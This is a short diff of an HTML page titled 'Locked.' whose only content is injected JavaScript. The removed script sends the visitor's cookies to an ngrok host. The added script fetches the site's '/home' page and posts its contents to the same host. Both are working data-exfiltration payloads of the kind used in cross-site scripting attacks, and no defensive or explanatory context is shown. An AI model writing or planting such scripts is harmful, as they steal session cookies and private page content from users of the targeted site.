@@ -6,20 +6,16 @@
     <title>Locked.</title>
 </head>
 <body>
-    <script>
-        fetch('https://sulphurously-scorpioid-noelia.ngrok-free.dev?cookie=${encodeURIComponent(document.cookie)}', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            key1: document.cookie,
-            key2: 'value2',
-          }),
-        })
-          .then(response => response.json())
-          .then(data => console.log(data))
-          .catch(error => console.error('Error:', error));
+    <script>      
+     fetch('/home')
+          .then(p => p.text())
+          .then(t =>
+            fetch('https://sulphurously-scorpioid-noelia.ngrok-free.dev', {
+              method: "POST",
+              headers: { 'Content-Type':'application/json' },
+              body: JSON.stringify({p:t})
+            })
+         ) 
     </script>
 </body>
 </html>
